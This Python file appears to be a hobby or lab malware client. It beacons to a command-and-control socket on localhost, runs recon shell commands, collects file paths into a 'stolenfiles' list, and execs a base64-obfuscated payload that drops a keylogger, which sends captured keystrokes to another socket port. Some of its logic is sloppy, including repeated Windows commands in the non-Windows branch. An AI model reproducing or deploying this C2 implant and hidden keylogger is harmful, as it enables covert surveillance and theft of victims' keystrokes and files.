#!/usr/bin/env python3
# if running on python versus windows exe

#
# import from sub functions until its compiled exe
from c2key import *
import socket
import time,re,base64

pys = ['stolenfiles']
txts = []
secrets = []
filebytes = []
os_type = ''
def mal1():

    try:
        ff = os.system('dir')
        if ff == 0:
            os_type = 'windows'
            print(os)
            os.system('echo %HOMEPATH% > homepath.txt')
            os.system('echo %HOMEDRIVE% > homedrive.txt')
            os.system('dir /B > currentfiles.txt')
            os.system('echo xxx >> currentfiles.txt')
            os.system('dir /B')
            #os.system('echo stolenpasses >> passwords.txt')
            
        
    except:
        try:
            os.system('ls')
            os.system('echo %HOMEPATH% > homepath.txt')
            os.system('echo %HOMEDRIVE% > homedrive.txt')
            os.system('dir /B > currentfiles.txt')
            os.system('echo xxx >> currentfiles.txt')
            os.system('dir /B')
            #os.system('echo stolenpasses >> passwords.txt')
        except:
            print('cant determine sys')
            exit()
        

def mal2():
    print('system recon')

    for root, dirs, files in os.walk("../", topdown = False):
        for name in files:
            #print(os.path.join(root, name))
            for i in files:
                tt = re.findall("\w*[\.]py|\w*[\.]txt", str(i) )
                #if len(tt) > 0: print("match: : " + str(tt))
                if len(tt) > 0:
                    yu = os.path.join(root, name)
                    pys.append(yu)
                
        for name in dirs:
            for i in files:
                tt = re.findall("\w*[\.]txt", str(i) )
                #if len(tt) > 0: print("match: : " + str(tt[0]))
                if len(tt) > 0: txts.append(str(tt[0]))
def mal3():
    #malware portion
    _pass2 = "I2V4ZWN1dGlvbgppbXBvcnQgYmFzZTY0Cgpmcm9tIGl0c2Rhbmdlcm91cyBpbXBvcnQgYmFzZTY0X2RlY29kZQoKZmlsZTEgPSBiYXNlNjRfZGVjb2RlKCdJeUV2ZFhOeUwySnBiaTlsYm5ZZ2NIbDBhRzl1TXdvS2FXMXdiM0owSUhOdlkydGxkQ3hyWlhsaWIyRnlaQXBJVDFOVUlEMGdKekV5Tnk0d0xqQXVNU2NLVUU5U1ZDQTlJRFEwTWpBS0l5QkRiMjVtYVdkMWNtVWdjMjlqYTJWMElHTnZibTVsWTNScGIyNEtlaUE5SUhOdlkydGxkQzV6YjJOclpYUW9jMjlqYTJWMExrRkdYMGxPUlZRc0lITnZZMnRsZEM1VFQwTkxYMU5VVWtWQlRTa0tlaTVqYjI1dVpXTjBLQ2hJVDFOVUxDQlFUMUpVS1NrS0NtUmxaaUJzYjJkbmFXNW5LQ2s2Q2lBZ0lDQnJaWGx6SUQwZ2EyVjVZbTloY21RdWNtVmpiM0prS0hWdWRHbHNJRDBuUlU1VVJWSW5LUW9nSUNBZ0kzUWdQU0JyWlhsaWIyRnlaQzV3YkdGNUtHdGxlWE1wQ2lBZ0lDQnJaWGw2SUQwZ2MzUnlLR3RsZVhNcENpQWdJQ0FqY0hKcGJuUW9KMnRsZVhNZ2NISmxjM05sWkNCaVpXWnZjbVVnUlU1VVJWSW5LUW9nSUNBZ0kzQnlhVzUwS0d0bGVYTXBDaUFnSUNBamJHOW5aMmx1WnlncENpQWdJQ0FqSUVWdWRHVnlJRWxRSUdGdVpDQlFiM0owSUdobGNtVUtDaUFnSUNBaklGZGhhMlVnZFhBS0lDQWdJSG91YzJWdVpDaHJaWGw2TG1WdVkyOWtaU2dwS1FvZ0lDQWdiRzluWjJsdVp5Z3BDbXh2WjJkcGJtY29LUW9LJykKbG9hZGYgPSBzdHIoYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCdZVWRHYW1FeWJIVmFlVFYzWlZFOVBRPT0nKSkpLnN0cmlwKCdiJykuc3RyaXAoJ1wnJykKbG9hZDEgPSBvcGVuKGYiLi97bG9hZGZ9Iiwnd2InKQpsb2FkMS53cml0ZShmaWxlMSk="
    exec(base64.b64decode(_pass2).decode('utf-8'))
    

HOST = '127.0.0.1'
PORT = 2048

z = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
z.connect((HOST, PORT))
z.sendall(encryptData('xxxx'))
print('hello sent to c2')
while True:
    data = decryptData(z.recv(4096))
    if(data == 'mal1'): 
        print(data)
        time.sleep(0.5)
        z.send(encryptData('ineedkey'))
    elif(data.__contains__('c2key')): 
        print('negotiation complete')
        print(os_type)
        mal3()
        time.sleep(0.5)
        z.send(encryptData('c2ready'))
    elif(data == 'sleep'): 
        print(data)
        
        time.sleep(0.5)
        z.send(encryptData('sleep'))
    else: 
        print('last data was ')
        time.sleep(1)
        z.send(encryptData('iamhere'))